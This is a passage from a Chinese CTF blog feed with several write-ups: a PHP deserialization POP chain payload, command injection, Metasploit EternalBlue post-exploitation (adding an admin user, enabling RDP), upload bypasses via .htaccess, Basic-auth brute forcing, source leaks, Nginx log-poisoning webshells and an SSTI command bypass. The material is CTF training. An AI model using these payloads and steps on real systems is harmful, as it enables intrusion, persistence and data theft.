class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        SH::$SHCTF = true;</span><br><span class="line">        $this-&gt;o-&gt;flag();</span><br><span class="line">        return &quot;其实。。。。,&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class SHCTF &#123;</span><br><span class="line">    public $isyou;</span><br><span class="line">    public $flag;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        if (SH::$Web) &#123;</span><br><span class="line"></span><br><span class="line">            ($this-&gt;isyou)($this-&gt;flag);</span><br><span class="line">            echo &quot;小丑竟是我自己呜呜呜~&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;小丑别看了!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#x27;data&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    unserialize(base64_decode($_GET[&#x27;data&#x27;]));</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    echo &quot;小丑离我远点！！！&quot;;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>分析代码，构造pop链：</p><p>T-&gt;__destruct() ----&gt;  F-&gt;__toString() ----&gt; C-&gt;flag() ----&gt; SHCTF-&gt;__invoke()</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class SH &#123;</span><br><span class="line"></span><br><span class="line">    public static $Web = false;</span><br><span class="line">    public static $SHCTF = false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C &#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class T&#123;</span><br><span class="line"></span><br><span class="line">    public $n;</span><br><span class="line">&#125;</span><br><span class="line">class F &#123;</span><br><span class="line">    public $o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class SHCTF &#123;</span><br><span class="line">    public $isyou;</span><br><span class="line">    public $flag;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$a = new SHCTF();</span><br><span class="line">$a-&gt;isyou = &quot;system&quot;;</span><br><span class="line">$a-&gt;flag = &quot;cat /f*&quot;;</span><br><span class="line">$b = new C();</span><br><span class="line">$b-&gt;p = $a;</span><br><span class="line">$c = new F();</span><br><span class="line">$c-&gt;o = $b;</span><br><span class="line">$d = new T();</span><br><span class="line">$d-&gt;n = $c;</span><br><span class="line"></span><br><span class="line">echo serialize($d);</span><br><span class="line">?&gt;</span><br><span class="line">//O:1:&quot;T&quot;:1:&#123;s:1:&quot;n&quot;;O:1:&quot;F&quot;:1:&#123;s:1:&quot;o&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;p&quot;;O:5:&quot;SHCTF&quot;:2:&#123;s:5:&quot;isyou&quot;;s:6:&quot;system&quot;;s:4:&quot;flag&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125;&#125;</span><br><span class="line">//base64:TzoxOiJUIjoxOntzOjE6Im4iO086MToiRiI6MTp7czoxOiJvIjtPOjE6IkMiOjE6e3M6MToicCI7Tzo1OiJTSENURiI6Mjp7czo1OiJpc3lvdSI7czo2OiJzeXN0ZW0iO3M6NDoiZmxhZyI7czo3OiJjYXQgL2YqIjt9fX19</span><br></pre></td></tr></table></figure><blockquote><p>传入base64编码后的内容，得到flag</p><p>SHCTF{d4b773f4-1dd4-4321-903f-aa718e1ea99d}</p></blockquote><h4 id="Week1-蛐蛐-蛐蛐">[Week1] 蛐蛐?蛐蛐!</h4><blockquote><p>考点：弱比较，命令执行</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013174644889.png" alt="image-20241013174644889"></p><blockquote><p>查看源码</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013174718789.png" alt="image-20241013174718789"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013174803030.png" alt="image-20241013174803030"></p><blockquote><p>第一个弱比较 ，直接传 ?ququ=114514a。</p></blockquote><blockquote><p>第二个直接使用命令执行:</p><p>ququ=ququk1;system(“cat /flag”);</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013175007576.png" alt="image-20241013175007576"></p><blockquote><p>得到flag</p><p>SHCTF{a317f4fb-8cfa-43d9-9bce-85ab6f8633c6}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali中metasploit使用</title>
      <link href="/posts/9375d9ee.html"/>
      <url>/posts/9375d9ee.html</url>
      
        <content type="html"><![CDATA[<h1>kali中metasploit使用</h1><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1e872c4cd10f79a63d862c2e8076cf90.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/62577fd08549538e7954aa69fc08e8c5.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4a4f354e8700b71e6a64bbacf835665f.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/03c79ac5eb64fafc8039b2073510fe97.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/22fb34311121e723024aef8d4770b853.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0bd2074ec17321ee3ff23e228b564694.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8fd0c7c69790abc63539f79b0f4fa84c.jpg" alt=""></p><blockquote><p>shell命令会开启目标机的cmd控制台，打开了这个就相当于可以执行任何命令。</p></blockquote><p><strong>打进去后，进行远程桌面连接的注意事项：</strong></p><p><strong>1.创建用户：net user username password /add</strong></p><p><strong>2.赋予用户管理员权限：net localgroup group_name UserLoginName /add</strong></p><p><strong>3.没有赋予管理员权限远程桌面连接是会失败的。</strong></p><p><strong>4.win7不能同时登陆一个账户，比如目标机登录了一个账户，攻击者在进行远程登录桌面时会把目标机顶下去。</strong></p><p><strong>一些注意事项：</strong></p><p><strong>1.run后报错Host does NOT appear vulnerable.：说明靶机打了补丁的，修复了永恒之蓝漏洞（补丁：KB4474419），删除就可以了。</strong></p><p><strong>2.run getgui -e报错：换成 run post/windows/manage/enable_rdp即可</strong></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8b320bd4fb77b7538bc5d6fab277b5fc.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传绕过</title>
      <link href="/posts/c2e822dd.html"/>
      <url>/posts/c2e822dd.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-文件头检查绕过">1.文件头检查绕过</h2><p>这类题进行文件头检查一般是检查concent-type的内容，需要修改成允许的文件类型就行,如 image/jpg<br>然后一句话木马前还要加上对应文件类型的前缀，如GIF89a<br>做这类题时可以先找到允许的文件类型，然后放进010editor看看标识符，然后修改</p><h2 id="MIME及绕过">MIME及绕过</h2><p>1. 什么是MIME：<br>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</p><p>2. 常见的MIME类型:<br>text/plain （纯文本）<br>text/html （HTML文档）<br>text/javascript （js代码）<br>application/xhtml+xml （XHTML文档）<br>image/gif （GIF图像）<br>image/jpeg （JPEG图像）<br>image/png （PNG图像）<br>video/mpeg （MPEG动画）<br>application/octet-stream （二进制数据）<br>application/pdf （PDF文档）</p><p>3. 检测方式：<br>在文件上传过程中，服务端会针对我们的上传的文件生成一个数组，这个数组其中有一项就是这个文件的类型file_type；服务端对文件进行检测时，就是通过检测脚本中的黑白名单和这个数组中的file_type进行对比，如果符合要求就允许上传这个文件。</p><p>4. MIME绕过的原理：<br>部分Web应用系统判定文件类型是通过content-type字段，黑客可以通过抓包，将content-type字段改为常见的图片类型，如image/gif，从而绕过校验。</p><h2 id="htaccess绕过">.htaccess绕过</h2><blockquote><p>知识：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p></blockquote><blockquote><p>介绍：hatccess文件，.htaccess是Apache的又一特色。<br>● 一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——.htaccess（分布式配置文件），<br>● 提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。<br>● 作为用户，所能使用的命令受到限制。<br>● 简单来说，就是我上传了一个.htaccess文件到服务器，那么服务器之后就会将特定格式的文件以php格式解析。</p></blockquote><p>常用内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. AddType application/x-httpd-php .png  //.png文件当作php文件解析</span><br><span class="line"></span><br><span class="line">2. //只要文件名中包含pass777，就会被Apache解析为php文件。</span><br><span class="line">   &lt;FilesMatch &quot;pass777&quot;&gt;</span><br><span class="line">   SetHandler application/x-httpd-php</span><br><span class="line">   &lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.9.26</title>
      <link href="/posts/ea2003c8.html"/>
      <url>/posts/ea2003c8.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><blockquote><p>ps:源自CTFhub</p></blockquote><h2 id="基础认证：">基础认证：</h2><p>在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看 <a href="https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81">https://zh.wikipedia.org/wiki/HTTP基本认证</a></p><blockquote><p>考点：http基础认证，脚本编写，爆破</p></blockquote><blockquote><p>访问 /flag 发现需要登录</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d3CuuayvCVYewwJQZ9CKq7.png" alt="img"></p><p>挂上 BurpSuite 的代理，随便输个账号密码（比如: 账号aaa 密码 bbb）访问，查看 HTTP 响应报文：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/mHCcfHrFbZ1EsLnRF4S6oD.png" alt="img"></p><p>得到提示 <code>do u konw admin ?</code>，于是猜测账号是 <code>admin</code> , 那么接下来就只需要爆破密码了</p><p>注意看到 HTTP 请求头部的 Authorization 字段:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Basic YWFhOmJiYg==</span><br></pre></td></tr></table></figure><p>Basic 表示是「基础认证」, 后面的 <code>YWFhOmJiYg==</code> 用 <code>base64</code> 解码后是 <code>aaa:bbb</code> , 也就是我们之前输入的 <code>账号:密码</code></p><p>使用 BurpSuite 进行基础认证爆破</p><ol><li>将报文发送到 <code>Intruder</code>, 将 <code>Basic</code> 后面 <code>base64</code> 部分添加为 <code>payload position</code></li></ol><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/iWZSTz79F5B6xjgc1fZjaF.png" alt="img"></p><ol><li><p>在 <code>Payloads</code> 选项卡下，选择 <code>Payload Type</code> 为 <code>SimpleList</code>, 然后在 <code>Payload Options</code> 中点击 <code>load</code> 加载密码字典</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/v7ZFtURkVZRWNNfSx7ANgv.png" alt=""></p></li></ol><p>Payload Processing<code>-&gt;</code>Add<code>-&gt; </code>Add Prefix<code>（添加前缀）-&gt; 输入 </code>admin:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/rK5WUQBdKtDMC3Lb8em6Z9.png" alt="img"></p><p>Payload Processing<code>-&gt;</code>Add<code>-&gt; </code>Encode`（添加一个编码方式）-&gt; 选择 Base64 Encode</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/jZocPqp6oAHwpyq9Fq3tgq.png" alt="img"></p><p>Payload Encode<code>取消勾选的</code>URL-encode<code>, 不然你会看到 base64 之后的 </code>=<code>会被转成</code>%3d` ，你就算爆破到天荒地老也不会出来</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7CYo3PHXcLpw8v3ivPFapV.png" alt="img"></p><p>Start Attack<code>，然后按</code>Status` 排序，看到状态码出现 200 的，即爆破成功</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/q8WhTrUghWgAw6sTZai7bj.png" alt="img"></p><p>查看 <code>Response</code> 得到 flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6xbDwpZGbWbiysF2r1xcYU.png" alt="img"></p><h1>网站源码</h1><p>考点：网站源码下载</p><p>对常见的备份文件进行扫描，发现存在<code>www.zip</code>，下载该文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240926211910629.png" alt="image-20240926211910629"></p><p>打开flag文件看看。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240926211942697.png" alt="image-20240926211942697"></p><p>仔细看看文件名，在网站上访问该txt即可获得flag</p><p><img src="upload/image-20240926211847161.png" alt="image-20240926211847161"></p><h2 id="bak文件泄露">bak文件泄露</h2><blockquote><p>考点：bak文件泄露</p></blockquote><blockquote><p>法一：直接.bak下载</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240926212955057.png" alt="image-20240926212955057"></p><blockquote><p>法二:curl <a href="http://challenge-ce94238df43bef85.sandbox.ctfhub.com:10800/index.php.bak">challenge-ce94238df43bef85.sandbox.ctfhub.com:10800/index.php.bak</a></p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240926213209539.png" alt="image-20240926213209539"></p><h2 id="vim缓存">vim缓存</h2><blockquote><p>考点：vim缓存</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240926213521841.png" alt="image-20240926213521841"></p><h2 id="DS-Store">.DS_Store</h2><blockquote><p>考点：.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240926214309765.png" alt="image-20240926214309765"></p><h2 id="Git泄露">Git泄露</h2><blockquote><p>考点：stash</p></blockquote><blockquote><p>直接进行 git-dumper</p><p>然后git log 查看日志</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240926221349584.png" alt="image-20240926221349584"></p><p>查看第二个日志，发现进行了改动。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240926221411893.png" alt="image-20240926221411893"></p><p>直接进行 git stash pop 从 git 栈中弹出来一个文件，这个文件的内容就是 flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240926221543642.png" alt="image-20240926221543642"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>账户密码登录爆破实例</title>
      <link href="/posts/2efbb28.html"/>
      <url>/posts/2efbb28.html</url>
      
        <content type="html"><![CDATA[<h2 id="基础认证：">基础认证：</h2><p>在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。</p><blockquote><p>考点：http基础认证，脚本编写，爆破</p></blockquote><blockquote><p>访问 /flag 发现需要登录</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d3CuuayvCVYewwJQZ9CKq7.png" alt="img"></p><p>挂上 BurpSuite 的代理，随便输个账号密码（比如: 账号aaa 密码 bbb）访问，查看 HTTP 响应报文：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/mHCcfHrFbZ1EsLnRF4S6oD.png" alt="img"></p><p>得到提示 <code>do u konw admin ?</code>，于是猜测账号是 <code>admin</code> , 那么接下来就只需要爆破密码了</p><p>注意看到 HTTP 请求头部的 Authorization 字段:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Basic YWFhOmJiYg==</span><br></pre></td></tr></table></figure><p>Basic 表示是「基础认证」, 后面的 <code>YWFhOmJiYg==</code> 用 <code>base64</code> 解码后是 <code>aaa:bbb</code> , 也就是我们之前输入的 <code>账号:密码</code></p><p>使用 BurpSuite 进行基础认证爆破</p><ol><li>将报文发送到 <code>Intruder</code>, 将 <code>Basic</code> 后面 <code>base64</code> 部分添加为 <code>payload position</code></li></ol><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/iWZSTz79F5B6xjgc1fZjaF.png" alt="img"></p><ol><li><p>在 <code>Payloads</code> 选项卡下，选择 <code>Payload Type</code> 为 <code>SimpleList</code>, 然后在 <code>Payload Options</code> 中点击 <code>load</code> 加载密码字典</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/v7ZFtURkVZRWNNfSx7ANgv.png" alt=""></p></li></ol><p>Payload Processing<code>-&gt;</code>Add<code>-&gt; </code>Add Prefix<code>（添加前缀）-&gt; 输入 </code>admin:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/rK5WUQBdKtDMC3Lb8em6Z9.png" alt="img"></p><p>Payload Processing<code>-&gt;</code>Add<code>-&gt; </code>Encode`（添加一个编码方式）-&gt; 选择 Base64 Encode</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/jZocPqp6oAHwpyq9Fq3tgq.png" alt="img"></p><p>Payload Encode<code>取消勾选的</code>URL-encode<code>, 不然你会看到 base64 之后的 </code>=<code>会被转成</code>%3d` ，你就算爆破到天荒地老也不会出来</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7CYo3PHXcLpw8v3ivPFapV.png" alt="img"></p><p>Start Attack<code>，然后按</code>Status` 排序，看到状态码出现 200 的，即爆破成功</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/q8WhTrUghWgAw6sTZai7bj.png" alt="img"></p><p>查看 <code>Response</code> 得到 flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6xbDwpZGbWbiysF2r1xcYU.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.9.21</title>
      <link href="/posts/7444966b.html"/>
      <url>/posts/7444966b.html</url>
      
        <content type="html"><![CDATA[<h2 id="NISACTF-2022-流量包里有个熊">[NISACTF 2022]流量包里有个熊</h2><p>考点：图片隐写，rot13密码，文件分离，流量包分析</p><p>来源：NSSCTF</p><p>下载附件，是个没有后缀名的文件，放进010查看，是一个流量包。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921093255929.png" alt="image-20240921093255929"></p><p>放进wireshark里，查看tcp流，发现有图片。下载下来</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921093434032.png" alt="image-20240921093434032"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921093551843.png" alt="image-20240921093551843"></p><p>将文件放进010查看，发现隐含了一个压缩包</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921094208887.png" alt="image-20240921094208887"></p><p>直接改后缀名为zip，然后解压出来得到一个文件夹</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921094307907.png" alt="image-20240921094307907"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921094331322.png" alt="image-20240921094331322"></p><p>文件有两个flag文件，先看第一个，是个base64编码，解码发现不是flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921094455821.png" alt="image-20240921094455821"></p><p>再看第二个文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921094550937.png" alt="image-20240921094550937"></p><p>这一串字符串刚开始看蒙了，然后看了一下别人的wp，才知道可能是16进制的位移文件。</p><p>SS Q8，联想到jpg文件的FF D8，S-&gt;F,刚好移了13位，用凯撒可以，也可以用rot13密码。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921095015123.png" alt="image-20240921095015123"></p><p>然后直接用010，新建16进制文件-&gt;粘贴自16进制文本，然后把解码出来的粘贴进去。得到一张jpg图片。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921095234864.png" alt="image-20240921095234864"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921095305684.png" alt="image-20240921095305684"></p><p>根据标签提示，盲水印，直接放进工具查看，得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240921095405306.png" alt="image-20240921095405306"></p><p>NSSCTF{S0_clev2l_You}，完事儿~</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx日志注入</title>
      <link href="/posts/9fe16725.html"/>
      <url>/posts/9fe16725.html</url>
      
        <content type="html"><![CDATA[<p>Nginx日志注入：</p><p>日志包含漏洞的成因还是服务器没有进行严格的过滤 ，导致用户可以进行任意文件读取，</p><p>但是前提是服务器需要开启了记录日志的功能才可以利用这个漏洞。</p><p>对于Apache，日志存放路径：/var/log/apache/access.log</p><p>对于Ngnix，日志存放路径：/var/log/nginx/access.log 和 /var/log/nginx/error.log</p><p>中间件的日志文件会保存网站的访问记录,比如HTTP请求行,User-Agent,Referer等客户端信息，如果在HTTP请求中插入恶意代码,那么恶意代码就会保存到日志文件中,访问日志文件的时候，日志文件中的恶意代码就会执行,从而造成任意代码执行甚至获取shell。</p><p>Nginx中的日志分两种，一种是error.log，一种是access.log。error.log可以配置成任意级别，默认级别是error，用来记录Nginx运行期间的处理流程相关的信息；access.log指的是访问日志，用来记录服务器的接入信息（包括记录用户的IP、请求处理时间、浏览器信息等）。</p><p><strong>一、 基础知识</strong></p><ul><li>/etc/nginx/nginx.conf：该文件是Nginx的配置的文件，该文件保存着能够影响服务器运行的配置信息。有时会泄露敏感信息。该文件支持php解析。</li><li>/var/log/nginx/access.log：该文件是Nginx的访问日志文件，Nginx会把每个用户访问信息记录到指定的日志文件里。该文件支持php解析。</li></ul><p>我们尝试读取它的日志文件：</p><p>?url=/var/log/nginx/access.log</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/17d62459f203a388712ca27670837c06.png" alt="img"></p><p>?url=/var/log/nginx/error.log</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9c96b8f8bd67cddea4b17e73b54196e1.png" alt="img"></p><p>尝试读取Linux系统下的用户信息：</p><p>?url=/etc/passwd</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/555ce9ac6884be27758722316bc99f66.png" alt="img"></p><p>从上面的日志信息可以看出是User-Agent的内容，这里我们在User-Agent里插入一句话木马</p><p>由于访问URL时，服务器会对其进行编码，所以我们通过使用burpsuite抓包来进行来注入</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/ce977cb9cce6cc662a5e914c8e9aa028.png" alt="img"></p><p>写入一句话木马之后，使用蚁剑尝试连接</p><p>连接url即为日志的地址：<a href="http://ec78819f-174d-4e26-82be-7cce55c08b05.challenge.ctf.show/?url=/var/log/nginx/access.log">http://ec78819f-174d-4e26-82be-7cce55c08b05.challenge.ctf.show/?url=/var/log/nginx/access.log</a></p><p>连接成功</p><p>进入后台，找到flag</p><p>ctfshow{8df69fe0-d37b-4231-a482-c3d93c89f43c}</p><ol start="2"><li>Linux常见日志的路径和功能总结</li></ol><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/wps2.jpg" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.9.11</title>
      <link href="/posts/5f69c5a8.html"/>
      <url>/posts/5f69c5a8.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="ctfshow愚人杯-easy-ssti">ctfshow愚人杯 easy_ssti</h2><blockquote><p>考点：ssti漏洞（<strong>见笔记</strong>）</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911195417125.png" alt="image-20240911195417125"></p><blockquote><p>查看源码</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911195446013.png" alt="image-20240911195446013"></p><blockquote><p>下载这个文件</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911195520690.png" alt="image-20240911195520690"></p><blockquote><p>打开查看代码，分析可能在/hello/路径下存在ssti漏洞</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import render_template_string,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/hello/&#x27;)</span><br><span class="line">def hello(name=None):</span><br><span class="line">    return render_template(&#x27;hello.html&#x27;,name=name)</span><br><span class="line">@app.route(&#x27;/hello/&lt;name&gt;&#x27;)</span><br><span class="line">def hellodear(name):</span><br><span class="line">    if &quot;ge&quot; in name:</span><br><span class="line">        return render_template_string(&#x27;hello %s&#x27; % name)</span><br><span class="line">    elif &quot;f&quot; not in name:</span><br><span class="line">        return render_template_string(&#x27;hello %s&#x27; % name)</span><br><span class="line">    else:</span><br><span class="line">        return &#x27;Nonononon&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">进行&#123;&#123;&#125;&#125;测试，发现真是</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911195713451.png" alt="image-20240911195713451"></p><blockquote><p>剩下的就是按照笔记那样的步骤一步一步走就行</p><p>重点强调一下如何找&lt;class ‘os._wrap_close’&gt;</p></blockquote><blockquote><p>1.先找到其位置</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911200145243.png" alt="image-20240911200145243"></p><blockquote><p>2.查询&lt;class ，再选中&lt;class ‘os._wrap_close’&gt;</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911200237432.png" alt="image-20240911200237432"></p><blockquote><p>3.上下查询即可看到第几个。下标就是再-1。这里就是133-1=132.</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911200338927.png" alt="image-20240911200338927"></p><blockquote><p>这道题在执行cat /flag命令时会Not Found。</p><p>猜测了一下，应该是将语句中的&quot;/&quot;当成目录了。</p><p>那就试试base64+管道符绕过。</p><p>注意要包一层反引号（命令执行），不然会被当做字符串echo出来。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#x27;cat /fl*&#x27;)替换成(&#x27; ` echo Y2F0IC9mKg== | base64 -d ` &#x27;)</span><br></pre></td></tr></table></figure><blockquote><p>最后得到flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911200749213.png" alt="image-20240911200749213"></p><h2 id="GDOUCTF-2023-ez-ze">[GDOUCTF 2023]&lt;ez_ze&gt;</h2><blockquote><p>考点：ssti漏洞，fenjing一把梭</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911204933643.png" 